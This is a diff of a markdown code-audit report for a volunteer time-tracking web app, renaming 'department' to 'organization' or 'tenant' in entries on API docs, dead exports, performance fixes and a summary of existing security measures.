-  - `docs/api/http.md:161` and `voluntime-audit.md` 142 and 177 describe `POST …/imports/departments` as available; it now returns 404.
+  - `docs/api/http.md:161` and `voluntime-audit.md` 142 and 177 describe `POST …/imports/tenants` as available; it now returns 404.
   - `http.md` is missing `/feedback`, `/brand`, `/webhooks/linear`, access requests, `unclassified-count`, `lookups`, `/usernames/preview`, `clock-cancel` and `clock-reset`.
   - The feature-workflow skill verifies production at `clocked-in.baddley.us`, but the portal doc says `voluntime.app`.
   - `docs/ops/prisma-adoption.md:66` says "GitHub"; it should say Linear.
@@ -774,7 +774,7 @@ Places that reimplement the display-name rule (DUP-03):
   | `features/time-entries.ts` | 1153 | parsers; lists; mutations; clock state machine (972–1135); unclassified helpers |
   | `features/feedback.ts` | 860 | the Linear sync and webhook (509–860) move to `feedback-linear.ts` |
   | `features/volunteer-needs.ts` | 799 | question schema; needs; sign-ups; public endpoints |
-  | `features/memberships.ts` | 789 | serializers; org memberships; department memberships |
+  | `features/memberships.ts` | 789 | serializers; org memberships; organization memberships |
   | `report-layout.ts` | 781 | constants and types; grid geometry; filters; templates |
   | `linear-issues.ts` | 693 | the Slack notifier |
 
@@ -789,8 +789,8 @@ Places that reimplement the display-name rule (DUP-03):
   | `memberships.ts` | 23 exports | 0 |
   | `feedback.ts` | 13 exports | 0 |
 
-  Explain `can()` with a department, `visibility()`, `roleScope()`, the clock state machine, and what counts as an unclassified entry.
-- **DOC-10 — Make `requireOrganization` calls readable · S.** [BAD-227](https://linear.app/baddley/issue/BAD-227) `Access.requireOrganization(id, admin: boolean)` has 45 call sites passing a bare `true` or `false`. Split it into `requireMember()` and `requireAdmin()`.
+  Explain `can()` with a organization, `visibility()`, `roleScope()`, the clock state machine, and what counts as an unclassified entry.
+- **DOC-10 — Make `requireTenant` calls readable · S.** [BAD-227](https://linear.app/baddley/issue/BAD-227) `Access.requireTenant(id, admin: boolean)` has 45 call sites passing a bare `true` or `false`. Split it into `requireMember()` and `requireAdmin()`.
 
 ### Operations
 
@@ -812,10 +812,10 @@ Places that reimplement the display-name rule (DUP-03):
   - `settings/email-templates/email-templates-view.tsx`
 - **DEAD-02 — Dead exports.** [BAD-229](https://linear.app/baddley/issue/BAD-229)
   - `archiveTagAction`
-  - `DepartmentForm`, `TaskCategoryForm`, `TagForm`, `CreateTagDialog`
+  - `OrganizationForm`, `TaskCategoryForm`, `TagForm`, `CreateTagDialog`
   - `HeaderSkeleton`, `StatsSkeleton`
   - `seedDefaultHourlyRate`
-  - `importDepartments` (about 90 lines; its route is a 404 stub)
+  - `importOrganizations` (about 90 lines; its route is a 404 stub)
   - `unclassifiedWhere` (reuse it in PERF-03 instead)
   - `SystemRoleCode`, `sendJson`, `orderUserIds`, `isNeedStatus`, `appHost`, `ValueIcon`, `contentWidth`
   - `hasPermission` and `workspaceCan` (duplicates of each other, both unused)
@@ -845,8 +845,8 @@ Places that reimplement the display-name rule (DUP-03):
 
 ### Performance (Low)
 
-- **PERF-15 — Large libraries load eagerly.** [BAD-238](https://linear.app/baddley/issue/BAD-238) Load TipTap through `next/dynamic` for read-only viewers (`organization-view.tsx`, `profile-form.tsx`; about 165 KB gzipped). Load Recharts lazily on the dashboard (about 120 KB gzipped).
-- **PERF-16 — Workspace payload too large.** [BAD-239](https://linear.app/baddley/issue/BAD-239) It sends up to 100 full orgs, markdown descriptions included (`organizations.ts` 206–242), and `getCurrentOrganization` runs `listOrganizations` again. Send only the switcher fields.
+- **PERF-15 — Large libraries load eagerly.** [BAD-238](https://linear.app/baddley/issue/BAD-238) Load TipTap through `next/dynamic` for read-only viewers (`tenant-view.tsx`, `profile-form.tsx`; about 165 KB gzipped). Load Recharts lazily on the dashboard (about 120 KB gzipped).
+- **PERF-16 — Workspace payload too large.** [BAD-239](https://linear.app/baddley/issue/BAD-239) It sends up to 100 full orgs, markdown descriptions included (`tenants.ts` 206–242), and `getCurrentTenant` runs `listTenants` again. Send only the switcher fields.
 - **PERF-17 — People and feedback pages.** [BAD-240](https://linear.app/baddley/issue/BAD-240) `people-view.tsx` 292 and 375 render both the desktop table and the mobile list. The report-grid drag isn't throttled with `requestAnimationFrame`. Feedback queries use `staleTime: 0` with refetch on focus (`queries.ts` 304–325).
 - **PERF-18 — Smaller query fixes.** [BAD-241](https://linear.app/baddley/issue/BAD-241) Look up the open timer with one `findFirst` (`queries.ts` 262–270). Batch-insert multi-day entries with `createManyAndReturn` (`time-entries.ts` 826–842).
 - **PERF-19 — Lists silently cap at 100.** [BAD-242](https://linear.app/baddley/issue/BAD-242) Lookups, members and orgs stop at 100 (`lookups.ts:10`, `dal.ts:54,129`). This is a correctness risk for large orgs: paginate, or raise the cap and show a warning.
@@ -919,7 +919,7 @@ These are believed to be real but were found by reading code only:
   - Cookies: `httpOnly`, `SameSite=Lax`, `Secure`, host-only, and they authenticate only GET/HEAD API calls.
   - Passwords and reset requests: bcrypt cost 12 with a dummy hash for unknown users, generic reset responses, and a password change revokes refresh tokens.
   - API keys: HMAC with a pepper, constant-time compare, enforced scopes.
-- **Tenant pinning only narrows access.** Foreign-key ownership is checked for most resources: projects, task categories, tags, departments, rates, themes, roles, templates, saved reports, connections and invitations.
+- **Tenant pinning only narrows access.** Foreign-key ownership is checked for most resources: projects, task categories, tags, organizations, rates, themes, roles, templates, saved reports, connections and invitations.
 - **Injection and rendering:** all raw SQL is parameterized. Markdown is rendered without raw HTML. The email sanitizer uses an allowlist, and the template preview iframe is sandboxed. CSV exports are formula-escaped. Uploads are size- and type-checked and re-encoded with sharp. The Linear webhook checks its HMAC with a timestamp window, and Turnstile fails closed.
 - **Code quality:** `strict` TypeScript, 0 `any`, 0 `@ts-ignore`, no TODOs or commented-out code, and `src` typechecks cleanly. REST, server actions and MCP all go through the same feature modules, so business logic isn't written three times.
 - **Tests:** HTTP contract tests assert full response shapes and literal money values. CI already runs migration tests against an isolated Postgres.
